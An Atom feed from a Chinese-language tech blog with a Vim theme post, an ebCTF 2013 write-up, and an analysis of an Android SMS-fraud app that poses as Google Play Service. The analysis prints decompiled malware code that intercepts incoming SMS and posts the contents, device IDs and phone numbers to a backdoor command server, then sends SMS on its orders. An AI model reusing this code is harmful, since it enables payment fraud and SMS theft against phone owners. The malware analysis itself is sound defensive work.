<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[blog.dm4.tw]]></title>
  <link href="http://blog.dm4.tw/atom.xml" rel="self"/>
  <link href="http://blog.dm4.tw/"/>
  <updated>2013-11-23T11:31:52+08:00</updated>
  <id>http://blog.dm4.tw/</id>
  <author>
    <name><![CDATA[dm4]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Vim iA Writer Theme for Markdown]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/23/vim-ia-writer-theme-for-markdown/"/>
    <updated>2013-11-23T10:45:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/23/vim-ia-writer-theme-for-markdown</id>
    <content type="html"><![CDATA[<p>前幾天看到 <a href="http://astrails.com/blog/2013/8/12/writing-markdown-with-style-in-vim">Writing Markdown With Style in Vim</a> 在講 vim 的 iA Writer theme
，試了之後覺得超棒的，決定以後的 markdown editor 就用 MacVim 了！</p>

<p>接著就查了一下 vim 的 ftplugin 大概怎麼做，然後因為寫 octopress
要用，所以也找了一下 Jekyll 的 YAML header syntax ，包一包就上傳啦！成品在
<a href="https://github.com/dm4/vim-writer">dm4/vim-writer</a>。</p>

<p>Screenshot:</p>

<p><img src="https://dl.dropboxusercontent.com/u/158785/blog/2013-11-23-screenshot.png" alt="screenshot" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[小額付費簡訊詐騙]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/"/>
    <updated>2013-11-09T12:22:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian</id>
    <content type="html"><![CDATA[<p>最近好像很流行收到這種奇怪的簡訊</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/10746549465/" title="Flickr 上 sunrisedm4 的 詐騙簡訊"><img src="http://farm3.staticflickr.com/2835/10746549465_c046942cc1.jpg" width="333" height="500" alt="詐騙簡訊"></a></p>

<p>用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 <code>User-Agent</code> 來決定要導到哪裡，
如果把 <code>User-Agent</code> 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結</p>

<p>不過大概是新聞報很大的原因，詐騙連結幾乎都已經失效了</p>

<p>把載下來的 apk 拆開會發現它是一個偽裝成 Google Play Service 的程式
（要拆 apk 推薦使用 <a href="http://code.google.com/p/androguard/">androguard</a> ，它的 Sublime Text plugin 簡直是神器&hellip;&hellip;）</p>

<p>使用到的權限和用到的 components</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=AndroidManifest.xml'></script>
<noscript><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.google.android.gmss&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
    &lt;uses-sdk android:minSdkVersion=&quot;4&quot; android:targetSdkVersion=&quot;17&quot;&gt;&lt;/uses-sdk&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;&gt;&lt;/uses-permission&gt;
    &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@7F020002&quot; android:label=&quot;@7F050000&quot; android:theme=&quot;@7F060001&quot;&gt;
        &lt;activity android:label=&quot;&quot; android:name=&quot;com.google.android.gmss.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;
                &lt;/action&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;
                &lt;/category&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.BootBroadcastReceiver&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;service android:exported=&quot;true&quot; android:label=&quot;@7F050000&quot; android:name=&quot;com.google.android.gmss.MouseCave&quot;&gt;
        &lt;/service&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.MouseEar&quot;&gt;
            &lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;&gt;
                &lt;/action&gt;
                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;&gt;
                &lt;/category&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.MouseNose&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.BlackCat&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;com.mouse.BlackCat&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre></noscript></div>


<p>可以看到這個 app 要了一些邪惡的權限，
並且有個 receiver 會偵測 <code>android.provider.Telephony.SMS_RECEIVED</code> 這個動作，
在收到簡訊的時候被觸發，是和小額付費比較有相關的地方</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=me.java'></script>
<noscript><pre><code>package com.google.android.gmss;
public class MouseEar extends android.content.BroadcastReceiver {
    // ...
            if(v3[v2].getMessageBody().toString().contains(&quot;*#060#&quot;) == 0) {
                if(com.google.android.gmss.c.a(p8) != 0) {
                    this.abortBroadcast();
                    v1 = new java.util.HashMap();
                    v1.put(&quot;type&quot;, &quot;1&quot;);
                    v1.put(&quot;source&quot;, v3[v2].getOriginatingAddress().toString());
                    v1.put(&quot;content&quot;, v3[v2].getMessageBody().toString());
                    new Thread(new com.google.android.gmss.h(this, v1, p8)).start();
                }
            } else {
                this.abortBroadcast();
                v1 = v3[v2].getOriginatingAddress();
                v4 = v3[v2].getMessageBody().substring(6);
                v5 = new java.util.HashMap();
                v5.put(&quot;phone_id&quot;, v4);
                v5.put(&quot;phone_num&quot;, v1);
                new Thread(new com.google.android.gmss.g(this, v5, p8)).start();
            }
    // ...
}
</code></pre></noscript></div>


<p>可以看到在收到新簡訊的時候，會判斷內容有沒有包括特定字串，
有的話就會把整個簡訊內容回傳，如果沒有的話只會回傳前六個字元</p>

<p>再往下追可以找到回報資料的伺服器位置和一些東西，不過當然也失效了</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=l.java'></script>
<noscript><pre><code>package com.google.android.gmss;
public class l {
    static String a;
    static String c;
    static String b;
    static String e;
    static String d;
    static String g;
    static String f;
    static String i;
    static String h;
    static java.util.List j;
    static l()
    {
        com.google.android.gmss.l.a = &quot;http://googleapp.leitungsen.de:1652/&quot;;
        com.google.android.gmss.l.b = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/submit&quot;).toString();
        com.google.android.gmss.l.c = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/deploy_report&quot;).toString();
        com.google.android.gmss.l.d = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/task_query&quot;).toString();
        com.google.android.gmss.l.e = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_blockrules&quot;).toString();
        com.google.android.gmss.l.f = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phones_query&quot;).toString();
        com.google.android.gmss.l.g = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phone_num_submit&quot;).toString();
        com.google.android.gmss.l.h = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_url&quot;).toString();
        com.google.android.gmss.l.i = &quot;c84258e9c39059a89ab77d846ddab909&quot;;
        com.google.android.gmss.l.j = new java.util.ArrayList();
        return;
    }
    public static com.google.android.gmss.p a(java.util.HashMap p6, int p7, android.content.Context p8)
    {
        switch(p7) {
            case 0:
                v2 = com.google.android.gmss.l.b;
                break;
            case 1:
                v2 = com.google.android.gmss.l.c;
                break;
            case 2:
                v2 = com.google.android.gmss.l.d;
                break;
            case 3:
                v2 = com.google.android.gmss.l.e;
                break;
            case 4:
                v2 = com.google.android.gmss.l.f;
                break;
            case 5:
                v2 = com.google.android.gmss.l.g;
                break;
            case 6:
                v2 = com.google.android.gmss.l.h;
                break;
            default:
                v2 = &quot;&quot;;
        }
        v0 = p8.getSystemService(&quot;phone&quot;);
        v3 = new java.util.ArrayList();
        if(p6 == 0) {
            p6 = new java.util.HashMap();
        }
        if(v0.getLine1Number().length() == 0) {
            p6.put(&quot;target_id&quot;, v0.getDeviceId());
        } else {
            p6.put(&quot;target_id&quot;, v0.getLine1Number());
        }
        p6.put(&quot;user_id&quot;, com.google.android.gmss.l.i);
        v4 = p6.keySet().iterator();
        while (v4.hasNext() != 0) {
            v0 = v4.next();
            v3.add(new org.apache.http.message.BasicNameValuePair(v0, p6.get(v0)));
        }
        v0 = new com.google.android.gmss.p();
        v0.b = v3;
        v0.c = 0;
        v0.a = v2;
        v1 = com.google.android.gmss.l.j;
        synchronized(v1) {
            com.google.android.gmss.l.j.add(v0);
        }
        if(com.google.android.gmss.m.a(p8) != 0) {
            com.google.android.gmss.l.a();
        }
        return v0;
    }
    public static void a()
    {
        v2 = com.google.android.gmss.l.j;
        synchronized(v2) {
            v1 = (com.google.android.gmss.l.j.size() - 1);
            while (v1 &gt;= 0) {
                v0 = com.google.android.gmss.l.j.get(v1);
                v3 = new org.apache.http.client.methods.HttpPost(v0.a);
                android.util.Log.i(&quot;HttpController&quot;, v0.a);
                v3.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(v0.b, &quot;UTF-8&quot;));
                v3 = new org.apache.http.impl.client.DefaultHttpClient().execute(v3);
                if(v3.getStatusLine().getStatusCode() != 200) {
                    v0.d = new StringBuilder(&quot;Error Response&quot;).append(v3.getStatusLine().toString()).toString();
                } else {
                    v0.d = org.apache.http.util.EntityUtils.toString(v3.getEntity());
                }
                v0.c = 1;
                com.google.android.gmss.l.j.remove(v1);
                v1 = (v1 - 1);
            }
        }
        return;
    }
    public static void a(android.content.Context p4)
    {
        v0 = com.google.android.gmss.l.a(0, 6, p4);
        v0.a();
        android.util.Log.i(&quot;ret&quot;, v0.d);
        if(v0.d.length() &gt; 0) {
            v0 = new org.json.JSONArray(v0.d).getJSONObject(0);
            v1 = new android.content.Intent();
            v1.setAction(&quot;android.intent.action.VIEW&quot;);
            v0 = v0.getString(&quot;msg_body&quot;);
            if(v0.contains(&quot;http://&quot;) == 0) {
                v0 = new StringBuilder(&quot;http://&quot;).append(v0).append(&quot;/&quot;).toString();
            }
            v1.setData(android.net.Uri.parse(v0));
            p4.startActivity(v1);
        }
        return;
    }
    public static void a(String p12, android.content.Context p13)
    {
        v3 = new org.json.JSONArray(p12);
        v4 = v3.length();
        v2 = 0;
        while (v2 &lt; v4) {
            v0 = v3.getJSONObject(v2);
            v5 = v0.getString(&quot;recipient&quot;);
            v6 = v0.getString(&quot;msg_body&quot;);
            v5.trim();
            v5 = v5.split(&quot;;&quot;);
            v7 = v5.length;
            v0 = 0;
            while (v0 &lt; v7) {
                v8 = v5[v0];
                android.util.Log.i(&quot;MSG&quot;, new StringBuilder(&quot;num: &quot;).append(v8).append(&quot;, msg_bdy:&quot;).append(v6).toString());
                com.google.android.gmss.l.a(v8, v6, p13);
                v0 = (v0 + 1);
            }
            v2 = (v2 + 1);
        }
        return;
    }
    public static void a(String p7, String p8, android.content.Context p9)
    {
        v0 = android.telephony.SmsManager.getDefault();
        if(p8.length() &lt;= 70) {
            v0.sendTextMessage(p7, 0, p8, 0, 0);
        } else {
            v6 = v0.divideMessage(p8).iterator();
            while (v6.hasNext() != 0) {
                v0.sendTextMessage(p7, 0, v6.next(), 0, 0);
            }
        }
        return;
    }
    public static String b()
    {
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(&quot;Product: &quot;).append(android.os.Build.PRODUCT).toString())).append(&quot;\x0aCPU_ABI: &quot;).append(android.os.Build.CPU_ABI).toString())).append(&quot;\x0aTAGS: &quot;).append(android.os.Build.TAGS).toString())).append(&quot;\x0aVERSION_CODES.BASE: 1&quot;).toString())).append(&quot;\x0aMODEL: &quot;).append(android.os.Build.MODEL).toString())).append(&quot;\x0aSDK: &quot;).append(android.os.Build$VERSION.SDK).toString())).append(&quot;\x0aVERSION.RELEASE: &quot;).append(android.os.Build$VERSION.RELEASE).toString())).append(&quot;\x0aDEVICE: &quot;).append(android.os.Build.DEVICE).toString())).append(&quot;\x0aDISPLAY: &quot;).append(android.os.Build.DISPLAY).toString())).append(&quot;\x0aBRAND: &quot;).append(android.os.Build.BRAND).toString())).append(&quot;\x0aBOARD: &quot;).append(android.os.Build.BOARD).toString())).append(&quot;\x0aFINGERPRINT: &quot;).append(android.os.Build.FINGERPRINT).toString())).append(&quot;\x0aID: &quot;).append(android.os.Build.ID).toString())).append(&quot;\x0aMANUFACTURER: &quot;).append(android.os.Build.MANUFACTURER).toString())).append(&quot;\x0aUSER: &quot;).append(android.os.Build.USER).toString();
    }
    public static void b(android.content.Context p6)
    {
        v2 = com.google.android.gmss.c.a(p6).b();
        if(v2.size() != 0) {
            v3 = p6.getSystemService(&quot;phone&quot;).getDeviceId();
            android.util.Log.i(&quot;SMS Reporter&quot;, &quot;Send SMS report&quot;);
            v1 = 0;
            while (v1 &lt; v2.size()) {
                com.google.android.gmss.l.a(v2.get(v1), new StringBuilder(&quot;*#060#&quot;).append(v3).toString(), p6);
                v1 = (v1 + 1);
            }
        }
        return;
    }
    public static void c(android.content.Context p3)
    {
        if(com.google.android.gmss.m.a(p3) != 0) {
            com.google.android.gmss.c.a(p3).a();
            v0 = com.google.android.gmss.l.a(0, 2, p3);
            v0.a();
            if(v0.d.length() != 0) {
                android.util.Log.i(&quot;ret&quot;, v0.d);
                com.google.android.gmss.l.a(v0.d, p3);
            }
        }
        return;
    }
}
</code></pre></noscript></div>


<p>裝了惡意程式之後會莫名其妙的被盜用小額付費的原因，
我<strong>猜</strong>應該是小額付費的認證簡訊會包含特定內容，把整封簡訊回傳是為了要拿到小額付費的認證碼，
如果不是小額付費的簡訊，這隻惡意程式會回傳前六個字元的原因，
我<strong>猜</strong>可能是覺得簡訊一開頭很有可能有人名吧，
一但拿到人名 + 電話，就又多了一個詐騙的目標&hellip;&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ebCTF 2013 Writeup]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/"/>
    <updated>2013-11-08T20:56:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup</id>
    <content type="html"><![CDATA[<p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>

<h2>BIN100</h2>

<p>擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。</p>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN300</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb
</span><span class='line'>(gdb) file moon
</span><span class='line'>(gdb) b luaL_loadbuffer
</span><span class='line'>Breakpoint 1 at 0x411110
</span><span class='line'>(gdb) r
</span><span class='line'>Breakpoint 1, 0x0000000000411110 in luaL_loadbuffer ()
</span><span class='line'>(gdb) x/3s $rsi
</span><span class='line'>0x627340 &lt;content.2593&gt;:    "p = 54111037\ng = 56321\n\nio.write(\"Enter your password: \")\nio.flush()\npassword=io.read()\nif string.len(password) ~= 32 then\n    print(\"Wrong!\")\n    return 0\nend\n\nv = g\nalpha = \"0123456789abcdef\"\nfor lo"...
</span><span class='line'>0x627408 &lt;content.2593+200&gt;:    "op =1,32 do\n    v = v * g\n    v = v % p\n    r = v % 16\n    good = string.sub(alpha,r+1,r+1)\n    if good ~= string.sub(password,loop,loop) then\n        print(\"Wrong!\")\n        return 0\n    end\nend\nprin"...
</span><span class='line'>0x6274d0 &lt;content.2593+400&gt;:    "t(\"Well done, the flag is: ebCTF{\"..password..\"}\")\n-- f02233aca4839124ee6ffa766883c47e\n"</span></code></pre></td></tr></table></div></figure>


<h3>Reference</h3>

<ul>
<li><a href="http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html">http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html</a></li>
</ul>


<h2>BIN400</h2>

<p>題目是要生出 5 個 MD5 一樣的 console executable PE32 ，分別會印出：</p>

<ul>
<li>File1: All Eindbazen are wearing wooden shoes</li>
<li>File2: All Eindbazen live in a windmill</li>
<li>File3: All Eindbazen grow their own tulips</li>
<li>File4: All Eindbazen smoke weed all day</li>
<li>File5: All Eindbazen are cheap bastards</li>
</ul>


<p>所以做 md5 collision ，原本檔案的內容是對自己做簡單的 hash 再從 hash 決定要印哪一句：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// by seanwu
</span><span class='line'>##include &lt;stdio.h&gt;
</span><span class='line'>const char* str[5]= {
</span><span class='line'>    "All Eindbazen are wearing wooden shoes",
</span><span class='line'>    "All Eindbazen live in a windmill",
</span><span class='line'>    "All Eindbazen grow their own tulips",
</span><span class='line'>    "All Eindbazen smoke weed all day",
</span><span class='line'>    "All Eindbazen are cheap bastards"
</span><span class='line'>};
</span><span class='line'>int main(int argc,char **argv){
</span><span class='line'>    FILE* f=fopen(argv[0],"rb");
</span><span class='line'>    fseek(f,-20005,SEEK_END);
</span><span class='line'>    int x=0;
</span><span class='line'>    unsigned char z;
</span><span class='line'>    for( int i=0; i&lt;20000; i++ ){
</span><span class='line'>        fread(&z,1,1,f);
</span><span class='line'>        x=(x*33331+z)%5;
</span><span class='line'>    }
</span><span class='line'>    x=(x+5)%5;
</span><span class='line'>    puts(str[x]);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<h3>Reference</h3>

<ul>
<li><a href="http://www.mscs.dal.ca/~selinger/md5collision/">http://www.mscs.dal.ca/~selinger/md5collision/</a></li>
<li><a href="http://www.woodmann.com/forum/archive/index.php/t-10096.html">http://www.woodmann.com/forum/archive/index.php/t-10096.html</a></li>
</ul>


<h2>CRY100</h2>

<ul>
<li><p>1st PART</p>

<p>  原文在 <a href="http://en.wikipedia.org/wiki/Klomp">http://en.wikipedia.org/wiki/Klomp</a> ，用原文來解對應。</p></li>
<li><p>2nd PART</p>

<p>  用的是 ADFGVX cypher 用的 key 是 &lsquo;CARGO&rsquo; ，可以到 <a href="http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en">http://www.cryptool-online.org/index.php?option=com_cto&amp;view=tool&amp;Itemid=91&amp;lang=en</a> 做完之後再找一下對應：</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'KZUJJUN06TR3T2T6ABTEAB163A3NREE1JZ6N3QFLIYHMP X7V6C6TUK53TZ653N2UNRB316WE11VZ3UV3AKKZUJJ3RV 6D6SZ6J32S11D353TDVZUN0UK68U2N6V23312T33V646N VE4VA36NJZ6N3NSAB3TQFLIYHMPX78UNRT30ETRKBTEAF QQ8U16J6VEV63KHQ8U164ES1U216W3TLL8U16EJJ13KFI Y8U1613386N3K346NRJETV62VZ321E0B4F4Q7' | tr -d ' ' | tr KZUJN06TR32ABEQFLIYHMPX7VC54 shipngordefmba0123456789tjvc
</span><span class='line'>
</span><span class='line'>shippingorderfrombramb1oemendaa1phone0123456789tojorisverhovenfindbe1oWa11theitemsshippedtoDoShopefS11DeverDthingiso8ifnotfee1freetocontactmeonphonenSmber01234567898indregardsbram1008i1opotatoes508i1ocaS1if1oWer228i1oapp1es1348i1o1ee8onesecondpartofthef1agbc1c09</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>3rd PART</p>

<p>  <code>base64</code> 之後猜測可能是被 <code>xor</code> 過後的 <code>jpeg</code> ，找出 <code>xor</code> key 之後 flag 在圖片裡。</p></li>
<li><p>4th PART</p>

<p>  切開之後直的看就是了！</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'thhneu hpeitr eafnw frleo otata uoghb rfirf ttseo' | tr ' ' $'\n'
</span><span class='line'>
</span><span class='line'>thhneu
</span><span class='line'>hpeitr
</span><span class='line'>eafnw
</span><span class='line'>frleo
</span><span class='line'>otata
</span><span class='line'>uoghb
</span><span class='line'>rfirf
</span><span class='line'>ttseo</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>5th PART</p>

<p>  人眼找對應：</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 5.txt | tr "[:lower:]" "[:upper:]" | tr SIWZGDRYUOMKQBTJPNFEHLX aistheflgbuprodywmcknxv
</span><span class='line'>
</span><span class='line'>a common mistake made by foreigners is that the netherlands legaliAed the use of cannabis and other recreational soft drugs. according the law any use of drugs is still illegal, but there is a tolerancy policy called gedoogbeleid for any soft drugs. this is a set of guidelines telling public prosecutors under which circumstances offenders should not be prosecuted. according to current gedoogbeleid the possession of a maximum amount of five grams cannabis for personal use is not prosecuted. cultivation is treated in a similar way. cultivation of 5 plants or less is usually not prosecuted when they are renounced by the cultivator.  so if you come to the netherlands and want to try some recreational use of soft drugs, beware that it is not legal. the fifth part for the flag is ab1fde</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>6th PART</p>

<p>  Caesar cipher with shift = 4</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 6.txt | tr "[:upper:]" "[:lower:]" | tr abcdefghijklmnopqrstuvwxyz wxyzabcdefghijklmnopqrstuv
</span><span class='line'>
</span><span class='line'>the delta works is a series of construction projects in the southwest of the netherlands to protect a large area of land around the rhine-meuse-scheldt delta from the sea. the works consist of dams, sluices, locks, dikes, levees, and storm surge barriers. the aim of the dams, sluices, and storm surge barriers was to shorten the dutch coastline, thus reducing the number of dikes that had to be raised.
</span><span class='line'>along with the zuiderzee works, delta works have been declared one of the seven wonders of the modern world by the american society of civil engineers. the last part of the flag is: one-five-f-three-four-}</span></code></pre></td></tr></table></div></figure>


<h2>CRY200</h2>

<p>聽大大說是要去對一堆 n 去做 gcd ，分解出其中一組質數 p, g ，接著再去暴力試出 e, d</p>

<h3>Reference</h3>

<ul>
<li><a href="http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/">http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/</a></li>
</ul>


<h2>CRY300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://pastebin.com/vsUZW2WF">http://pastebin.com/vsUZW2WF</a></li>
</ul>


<h2>CRY400</h2>

<h2>FOR100</h2>

<p>先 <code>strings</code> 發現</p>

<pre><code>eindbazen@eindbazen:~$ python2 ctf.py ' i hide my '
</code></pre>

<p>感覺就是他了！所以試著 <code>grep ctf.py</code> 沒東西之後，再試了 <code>grep sys.argv</code> 會找到一段 <code>python</code> code</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>import time
</span><span class='line'>import random
</span><span class='line'>import signal
</span><span class='line'>from Crypto.Cipher import AES
</span><span class='line'>key1 = "is this where"
</span><span class='line'>key2 = sys.argv[1]
</span><span class='line'>key3 = raw_input("Password: ")
</span><span class='line'>iv = 'a very random iv'
</span><span class='line'>secret = './flag'
</span><span class='line'>mode = AES.MODE_CBC
</span><span class='line'>def encrypt(signum, frame):
</span><span class='line'>    key = key1 + key2 + key3
</span><span class='line'>    enc = AES.new(key, mode, iv)
</span><span class='line'>    inp = raw_input("Enter secret: ")
</span><span class='line'>    diff = len(inp) % 16
</span><span class='line'>    if diff != 0:
</span><span class='line'>    inp += ' ' * (16 - diff)
</span><span class='line'>    with open(secret, 'wb') as outfile:
</span><span class='line'>        outfile.write(enc.encrypt(inp))
</span><span class='line'>    del key, enc
</span><span class='line'>def decrypt(signum, frame):
</span><span class='line'>    key = key1 + key2 + key3
</span><span class='line'>    enc = AES.new(key, mode, iv)
</span><span class='line'>    with open(secret, 'rb') as infile:
</span><span class='line'>        print(enc.decrypt(infile.read(48)))
</span><span class='line'>    del key, enc
</span><span class='line'>signal.signal(signal.SIGUSR1, encrypt)
</span><span class='line'>signal.signal(signal.SIGUSR2, decrypt)
</span><span class='line'>while True:
